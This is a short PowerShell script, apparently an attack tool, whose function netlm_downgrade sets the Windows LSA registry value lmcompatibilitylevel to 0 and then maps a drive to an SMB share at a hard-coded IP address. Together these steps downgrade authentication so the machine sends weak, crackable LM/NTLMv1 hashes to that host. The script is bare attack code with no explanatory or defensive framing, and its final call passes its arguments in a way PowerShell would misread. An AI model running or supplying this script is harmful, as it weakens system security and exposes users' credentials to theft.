function netlm_downgrade ($ip,$path)
{
    Write-Output "Enabling Registry...."
    Set-ItemProperty -Path Registry::HKLM\System\CurrentControlSet\Control\Lsa  -Name lmcompatibilitylevel -Value 0
    net use z: \\$ip\$path
    #Write-Output  "net use z: \\$ip\$path"
}
netlm_downgrade("192.168.145.162","\Backup")